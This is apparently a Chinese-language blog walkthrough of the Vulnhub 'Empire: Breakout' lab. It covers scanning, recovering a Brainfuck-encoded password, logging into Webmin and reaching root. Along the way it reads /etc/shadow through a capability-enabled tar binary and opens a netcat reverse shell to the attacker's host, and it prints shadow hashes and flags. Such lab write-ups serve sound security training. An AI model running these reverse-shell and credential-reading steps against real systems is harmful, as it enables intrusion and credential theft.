---
title: Vulnhub-Empire Breakout
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# Empire: Breakout

> https://www.vulnhub.com/entry/empire-breakout,751/
> 

## 端口扫描主机发现

1. 探测存活主机，`183`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:37 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00045s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00025s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.183
    Host is up (0.00011s latency).
    MAC Address: 00:0C:29:BD:9A:8D (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00037s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口，仅存在`80`端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.183
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:40 CST
    Nmap scan report for 192.168.75.183
    Host is up (0.0010s latency).
    Not shown: 65530 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    80/tcp    open  http
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    10000/tcp open  snet-sensor-mgmt
    20000/tcp open  dnp
    MAC Address: 00:0C:29:BD:9A:8D (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,139,445,10000,20000 192.168.75.183
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:41 CST
    Nmap scan report for 192.168.75.183
    Host is up (0.00047s latency).
    
    PORT      STATE SERVICE     VERSION
    80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
    139/tcp   open  netbios-ssn Samba smbd 4.6.2
    445/tcp   open  netbios-ssn Samba smbd 4.6.2
    10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
    20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
    MAC Address: 00:0C:29:BD:9A:8D (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,139,445,10000,20000 192.168.75.183
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:42 CST
    Nmap scan report for 192.168.75.183
    Host is up (0.00028s latency).
    
    PORT      STATE SERVICE
    80/tcp    open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-csrf: 
    
    									......................
    									
    |_    Form action: https://www.google.com/search
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |_  /manual/: Potentially interesting folder
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    10000/tcp open  snet-sensor-mgmt
    | http-vuln-cve2006-3392: 
    |   VULNERABLE:
    |   Webmin File Disclosure
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2006-3392
    |       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
    |       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
    |       to bypass the removal of "../" directory traversal sequences.
    |       
    |     Disclosure date: 2006-06-29
    |     References:
    |       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
    |       http://www.exploit-db.com/exploits/1997/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
    20000/tcp open  dnp
    MAC Address: 00:0C:29:BD:9A:8D (VMware)
    
    Host script results:
    |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
    |_smb-vuln-ms10-054: false
    |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]
    ```
    
    `139，445`是`netbios-ssn` ，`80`是web服务，并且10000端口运行的是`webmin` ，并且扫出漏洞`CVE-2006-3392` 任意文件读取
    

## web渗透

### 80端口

1. 还是先从`80`端口开始吧，访问主页是`Apache2 Debian` 的默认页面
    
    ![image.png](image%2065.png)
    
    检查一下页面，`F12`发现存在一段文字
    
    ```python
    
    don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
    
    ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
    ```
    
    这一长串的不知名的是什么玩意？Google了一下这是`Brainfuck` （一种编程语言），解释后是
    
    ```python
    .2uqPEfj3D<P'a-3
    ```
    
    可能是一串明文密码
    
2. 扫描一下目录，就扫描出了`manual`目录，也就是文档目录，估计也不会藏东西

### 10000端口

1. 指纹识别没识别出来，但是`LOGO`写的是`webmin`，并且`nmap`也扫描出了漏洞
    
    ![image.png](image%2066.png)
    
2. 因为之前得到了一串明文密码，我们可以用它来尝试枚举用户名，枚举了一下就被封`ip`了（笑），目录扫描也不行
3. 尝试利用扫出来的漏洞`CVE-2006-3392` ，在`searchexploit`搜索了两个脚本，`pl`的需要设置`ssl` 证书，`php`的爆不出来，这条路也放弃了
4. 因为目标服务器装了`samba` ，所以我们可以使用**`Enum4linux`** 工具来枚举信息
    
    ```python
    **Enum4linux 192.168.75.183
    //**
    [+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                       
                                                                                                                                                                                                                      
    S-1-22-1-1000 Unix User\cyber (Local User)
    ```
    
    枚举出一个用户`cyber` ，配合之前的得到的明文密码`.2uqPEfj3D<P'a-3`，可以尝试登陆一下
    
5. 在`10000` 端口尝试密码错误，切换到`20000`端口尝试（`20000`端口也是相同登陆页面）登陆成功，进入后台

## 后台利用

1. 进入后台，开始搜寻可利用的点
    
    ![image.png](image%2067.png)
    
2. 看到底下有一个我i们感兴趣的`Command shell` ，点击后进入命令行了
    
    ![image.png](image%2068.png)
    

## 提权

1. 查看权限（这里的shell比反弹的好用，就没反弹）
    
    ```python
    [cyber@breakout ~]$ whoami
    cyber
    [cyber@breakout ~]$ id
    uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
    [cyber@breakout ~]$ uname -a
    Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
    ```
    
2. 寻找敏感文件
    - 当前家目录文件夹下存在`tar`和`user.txt` 文件
        
        ```python
        # user.txt
        [cyber@breakout ~]$ cat user.txt
        3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
        ```
        
        `tar`是一个可执行文件，我们检测suid 和capability，通过**`getcap`**命令发现它有**`cap_dac_read_search=ep`**，因此它可以读取任意文件（利用该tar 打包再解压就可以查看没有权限查看的文件内容）
        
        ```python
        [cyber@breakout ~]$ ls -al | grep tar
        -rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
        [cyber@breakout ~]$ getcap tar
        tar cap_dac_read_search=ep
        ```
        
3. 这样我们就可以使用`tar`来读取隐私文件了
    - 读取`shadow`文件，注意：使用`tar`必须是家目录下的`tar`
        
        ```python
        [cyber@breakout ~]$ ./tar -cvf shadow.tar /etc/shadow
        ./tar: Removing leading `/' from member names
        /etc/shadow
        [cyber@breakout ~]$ ./tar -xvf shadow.tar
        etc/shadow
        [cyber@breakout ~]$ cat etc/shadow
        root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:99999:7:::
        daemon:*:18919:0:99999:7:::
        bin:*:18919:0:99999:7:::
        sys:*:18919:0:99999:7:::
        sync:*:18919:0:99999:7:::
        games:*:18919:0:99999:7:::
        man:*:18919:0:99999:7:::
        lp:*:18919:0:99999:7:::
        mail:*:18919:0:99999:7:::
        news:*:18919:0:99999:7:::
        uucp:*:18919:0:99999:7:::
        proxy:*:18919:0:99999:7:::
        www-data:*:18919:0:99999:7:::
        backup:*:18919:0:99999:7:::
        list:*:18919:0:99999:7:::
        irc:*:18919:0:99999:7:::
        gnats:*:18919:0:99999:7:::
        nobody:*:18919:0:99999:7:::
        _apt:*:18919:0:99999:7:::
        systemd-timesync:*:18919:0:99999:7:::
        systemd-network:*:18919:0:99999:7:::
        systemd-resolve:*:18919:0:99999:7:::
        messagebus:*:18919:0:99999:7:::
        cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::
        systemd-coredump:!*:18919::::::
        ```
        
4. 尝试`john`破解`root`密码
    
    将root的密码复制保存到`password`
    
    ```python
    john password --format=crypt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (crypt, generic crypt(3) [?/64])
    Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
    Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
    Will run 8 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst
    ```
    
    破解了很久没爆出来
    
5. 我们接着寻找敏感文件
    - 在 `/var/backups` 下存在 `.old_pass.bak` ,我们使用上面步骤查看文件内容
        
        ```python
        [cyber@breakout ~]$ ./tar -cvf old_pass.tar /var/backups/.old_pass.bak
        ./tar: Removing leading `/' from member names
        /var/backups/.old_pass.bak
        [cyber@breakout ~]$ ./tar -xvf old_pass.tar
        var/backups/.old_pass.bak
        [cyber@breakout ~]$ cat var/backups/.old_pass.bak
        Ts&4&YurgtRX(=~h
        ```
        
        得到一串明文`Ts&4&YurgtRX(=~h` ，可能是密码
        
6. 我们可以尝试一下`root`账号使用上面得到的明文登录
    - 在网页上的命令行是不行，我们进行反弹`shell` ，同时`kali`开启监听
        
        ```python
        # kali 监听
        nc -lvp 1234            
        listening on [any] 1234 ...
        
        # 网页命令行反弹shell
        nc 192.168.75.151 1234 -e /bin/bash
        ```
        
    - 获得`shell`之后直接`su root`
        
        ```python
        nc -lvp 1234            
        我们可以尝192.168.75.183: inverse host lookup failed: Unknown host
        connect to [192.168.75.151] from (UNKNOWN) [192.168.75.183] 41962
        
        id
        uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
        su root
        Ts&4&YurgtRX(=~h
        id
        uid=0(root) gid=0(root) groups=0(root)
        ```
        
        获得权限！！！
        
7. 读取`flag`文件
    
    ```python
    # cat rOOt.txt
    3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
    
    Author: Icex64 & Empire Cybersecurity
    ```